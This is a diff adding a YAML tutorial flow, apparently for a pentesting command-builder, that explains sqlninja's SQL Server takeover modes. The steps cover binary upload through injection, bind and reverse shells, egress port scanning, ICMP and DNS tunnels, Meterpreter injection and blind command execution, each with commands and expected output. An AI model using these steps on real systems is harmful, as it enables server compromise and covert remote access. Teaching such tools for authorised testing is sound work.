@@ -133,6 +133,179 @@ flows:
             cause: "The current user lacks the privilege to change server configuration."
             fix: "Re-check step 4's fingerprint; without sysadmin this mode won't work."
             check: "—"
+  - flow_id: shell_modes
+    title: "The other attack modes explained (reference)"
+    goal: >
+      The mode dropdown offers 13 modes total, but the guided flow above only walks through
+      t/f/x. Once you're past fingerprinting and xp_cmdshell is working, THIS is how you
+      actually get a shell (or run one-off commands) — each mode below is a different way to
+      do that, for a different network situation. Picking the right one depends on what
+      backscan (k) tells you is actually reachable.
+    command_builder_id: sqlninja
+    slots: [PROGRAM, ACTION_OPTIONS, EXTRA_FILES]
+    steps:
+      - step_id: sm1
+        title: "-m u (upload) — get a binary onto the DB server first"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "Uploads a binary (netcat, dnstun.exe, etc.) to the server using only GET/POST HTTP requests through the injection — no FTP needed. sqlninja converts it to a DEBUG.EXE script on the fly and reassembles it in 64KB chunks."
+          why: "Almost every shell mode below (dirshell/backscan/revshell need netcat; dnstunnel needs dnstun.exe) requires this to run FIRST — there's no shell without a shell binary already on the box."
+          where: "ACTION_OPTIONS; -m u, optionally -p <sa password> if you don't have native sysadmin, -g to only generate the script without uploading."
+        find_it: "sqlninja ships netcat, dnstun, and churrasco pre-built in its apps/scripts directories — you don't need to supply your own binary for the common cases."
+        command_anatomy:
+          - {token: "sqlninja -m u -f sqlninja.conf", does: "upload mode with the same config file"}
+        try_this: "sqlninja -m u -f sqlninja.conf"
+        success_criteria: "sqlninja confirms the file uploaded and the byte count/line count matches."
+        expected_output: |
+          [+] Uploading netcat...
+          [+] Upload complete (128 lines, matches expected size)
+        alternatives:
+          - trigger: "line count doesn't match / upload seems corrupt"
+            cause: "A query got executed more than once (a known quirk with some connection setups), or the connection dropped mid-upload."
+            fix: "Re-run the upload; sqlninja reports how many lines it saw vs. expected, which helps diagnose the mismatch."
+            check: "The reported line count matches on a retry."
+      - step_id: sm2
+        title: "-m s (dirshell) — direct shell, if the DB server is directly reachable"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "If you can reach the DB server directly on some TCP/UDP port (no firewall in the way), dirshell tells the uploaded netcat to bind a command prompt to that port, then connects to it. sqlninja prompts you for the port and protocol interactively."
+          why: "The simplest, most direct shell mode — try this first before the more elaborate backscan/revshell/tunnel modes below."
+          where: "ACTION_OPTIONS; -m s. Needs netcat already uploaded (previous step)."
+        find_it: "You need to already know (or guess) a port that's open inbound to the DB server — check with your earlier nmap results."
+        command_anatomy:
+          - {token: "sqlninja -m s -f sqlninja.conf", does: "dirshell mode, same config"}
+        try_this: "sqlninja -m s -f sqlninja.conf"
+        success_criteria: "sqlninja connects and you get an interactive command prompt on the DB server."
+        expected_output: |
+          [+] Enter the remote port to bind: 4444
+          [+] Connecting... shell obtained!
+        alternatives:
+          - trigger: "connection refused / times out"
+            cause: "A firewall blocks direct inbound connections to the DB server."
+            fix: "Move on to backscan (next step) to find an outbound-allowed port instead."
+            check: "—"
+      - step_id: sm3
+        title: "-m k (backscan) — find which outbound port the firewall actually allows"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "When dirshell isn't possible (firewalled), backscan tells the DB server to send SYN/UDP packets back to YOUR machine across a port range you specify — whichever ones you actually receive are the ports the firewall lets out."
+          why: "This turns 'I don't know what's allowed outbound' into a concrete port list, which is exactly what revshell (next step) needs."
+          where: "ACTION_OPTIONS; -m k. Needs your IP (lhost) and listening interface (device) set in the config file, root privileges (raw packet capture), and netcat already uploaded."
+        find_it: "Pick a plausible port range to test (e.g. common outbound-allowed ports: 53, 80, 443, or a wider range like 1-1000)."
+        command_anatomy:
+          - {token: "sudo sqlninja -m k -f sqlninja.conf", does: "backscan needs root for packet capture"}
+        try_this: "sudo sqlninja -m k -f sqlninja.conf"
+        success_criteria: "sqlninja reports which port(s) it received packets back on."
+        expected_output: |
+          [+] Enter port range to scan: 1-1000
+          [+] Packets received on port: 53/udp
+        alternatives:
+          - trigger: "no packets received on any port"
+            cause: "Very restrictive egress filtering, or lhost/device misconfigured in sqlninja.conf."
+            fix: "Double check lhost is your real reachable IP and device is the correct listening interface; try a wider or different port range."
+            check: "—"
+      - step_id: sm4
+        title: "-m r (revshell) — reverse shell, using the port backscan found"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "Once backscan found a working outbound port, revshell tells the uploaded netcat to connect BACK to your machine on that port, giving you a shell without needing any inbound access to the target at all."
+          why: "The standard fallback whenever direct/dirshell access isn't possible but some outbound port is open — this is the most commonly used shell mode in practice."
+          where: "ACTION_OPTIONS; -m r. Needs lhost set in the config file and netcat already uploaded."
+        find_it: "The port/protocol backscan (previous step) confirmed as reachable."
+        command_anatomy:
+          - {token: "sqlninja -m r -f sqlninja.conf", does: "revshell mode, same config"}
+        try_this: "sqlninja -m r -f sqlninja.conf"
+        success_criteria: "sqlninja starts listening, the DB server connects back, and you get a shell."
+        expected_output: |
+          [+] Enter local port to bind: 53
+          [+] Listening... connection received, shell obtained!
+        alternatives:
+          - trigger: "no connection comes back"
+            cause: "The port backscan found may have since changed, or protocol (TCP/UDP) mismatch."
+            fix: "Re-confirm with backscan; make sure you picked the same protocol it reported."
+            check: "—"
+      - step_id: sm5
+        title: "-m i (icmpshell) — tunnel a shell inside ping packets"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "When no port (direct or reverse) works but the DB server CAN ping your box, icmpshell tunnels an entire shell session inside ICMP Echo (ping) packets — needs icmpsh.exe uploaded first. sqlninja interactively asks for buffer size, send delay, and response timeout to tune tunnel speed vs. stealth."
+          why: "A last resort when every normal port is blocked — ICMP often isn't filtered as strictly as TCP/UDP ports."
+          where: "ACTION_OPTIONS; -m i. Your own machine's ICMP echo replies must be disabled first (`sysctl -w net.ipv4.icmp_echo_ignore_all=1`) or the tunnel breaks."
+        find_it: "Confirm the DB server can reach you via ICMP (a ping test) before trying this mode."
+        command_anatomy:
+          - {token: "sqlninja -m i -f sqlninja.conf", does: "icmpshell mode, same config"}
+        try_this: "sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1 && sqlninja -m i -f sqlninja.conf"
+        success_criteria: "sqlninja establishes the ICMP tunnel and you get a (slow but working) shell."
+        expected_output: |
+          [+] Data buffer size [64]:
+          [+] ICMP tunnel established, shell obtained!
+        alternatives:
+          - trigger: "no shell / no ICMP traffic seen"
+            cause: "ICMP is blocked outbound from the DB server too, or your own OS is auto-replying and breaking the tunnel."
+            fix: "Confirm the sysctl setting took effect; if ICMP is fully blocked, try dnstunnel instead (next step)."
+            check: "—"
+      - step_id: sm6
+        title: "-m d (dnstunnel) — tunnel a shell through DNS lookups"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "The last-resort mode: if even ICMP is blocked, but the DB server can resolve external hostnames, dnstunnel encodes command output into a series of hostnames (e.g. <encoded>.yourdomain.com) that the DB server's own DNS resolution ends up sending to a DNS server you control."
+          why: "DNS resolution is almost never fully blocked (it would break normal internet use), making this the most reliable — if slowest — tunnel of all."
+          where: "ACTION_OPTIONS; -m d. Needs dnstun.exe already uploaded, a domain you control the authoritative DNS for (set in the config file), and root (sqlninja binds port 53 itself)."
+        find_it: "You need to actually own a domain (or subdomain) and point its NS records at your machine — not something you can fake for a quick test."
+        command_anatomy:
+          - {token: "sudo sqlninja -m d -f sqlninja.conf", does: "dnstunnel needs root to bind port 53"}
+        try_this: "sudo sqlninja -m d -f sqlninja.conf"
+        success_criteria: "Command output streams back, decoded from the incoming DNS requests."
+        expected_output: |
+          [+] DNS tunnel active, waiting for requests...
+          [+] Decoded: Microsoft Windows [Version ...]
+        alternatives:
+          - trigger: "nothing comes back"
+            cause: "Your domain's NS delegation isn't pointing at this machine yet, or the DB server can't resolve external names at all."
+            fix: "Verify NS delegation with `dig NS yourdomain.com` from outside your network; confirm outbound DNS resolution works from the target's perspective."
+            check: "—"
+      - step_id: sm7
+        title: "-m m (metasploit) — wrap the shell into Meterpreter or VNC"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "If you have sysadmin + working xp_cmdshell + any allowed TCP port (inbound or outbound), metasploit mode automates the whole chain: it calls msfpayload to build a stager, uploads it, disables DEP if needed, then calls msfcli to inject either a Meterpreter session or a VNC server."
+          why: "Meterpreter is far more capable than a plain shell (credential dumping, pivoting, port forwarding); VNC gives full graphical desktop access to the DB server."
+          where: "ACTION_OPTIONS; -m m, no extra parameters — sqlninja prompts interactively for Meterpreter vs VNC and direct vs reverse. Needs the Metasploit Framework installed and, for msfpayload/msfcli, on your PATH (or set msfpath in the config file)."
+        find_it: "Confirm fingerprint mode showed sysadmin + working xp_cmdshell first — this mode assumes both are already true."
+        command_anatomy:
+          - {token: "sqlninja -m m -f sqlninja.conf", does: "metasploit wrapper mode, same config"}
+        try_this: "sqlninja -m m -f sqlninja.conf"
+        success_criteria: "A Meterpreter session opens (or a VNC connection, if chosen) against the DB server."
+        expected_output: |
+          [+] Meterpreter or VNC? meterpreter
+          [+] Direct or reverse? reverse
+          [+] Session 1 opened
+        alternatives:
+          - trigger: "msfpayload/msfcli not found"
+            cause: "Metasploit isn't installed, or its executables aren't on PATH."
+            fix: "Install the Metasploit Framework, or set msfpath in sqlninja.conf to its install directory."
+            check: "—"
+      - step_id: sm8
+        title: "-m c (sqlcmd) — run one blind OS command, no shell at all"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "Sends a single OS command through xp_cmdshell WITHOUT trying to get a shell or see the output — useful when every shell mode above fails (ports filtered, DNS/ICMP blocked too), or you just need to do one thing (add a user, drop a file) and prove impact."
+          why: "You can still confirm a command ran by timing it (e.g. `ping -n 5 127.0.0.1` on success) or checking a dropped file — it's blind, not useless."
+          where: "ACTION_OPTIONS; -m c, no extra parameters — sqlninja prompts you for the command to run."
+        find_it: "Any DOS command you want executed on the server."
+        command_anatomy:
+          - {token: "sqlninja -m c -f sqlninja.conf", does: "sqlcmd mode, same config"}
+        try_this: "sqlninja -m c -f sqlninja.conf"
+        success_criteria: "The command is submitted without error (you won't see its output — that's expected)."
+        expected_output: |
+          [+] Enter the command to run: echo pwned > c:\proof.txt
+          [+] Command sent.
+        alternatives:
+          - trigger: "not sure it actually ran"
+            cause: "This mode is blind by design."
+            fix: "Use a timing trick (a command that only delays on success, e.g. `if exist file (ping -n 5 127.0.0.1)`), or check ERRORLEVEL."
+            check: "—"
+
 quick_build:
   builder: sqlninja
   title: "Quick run"
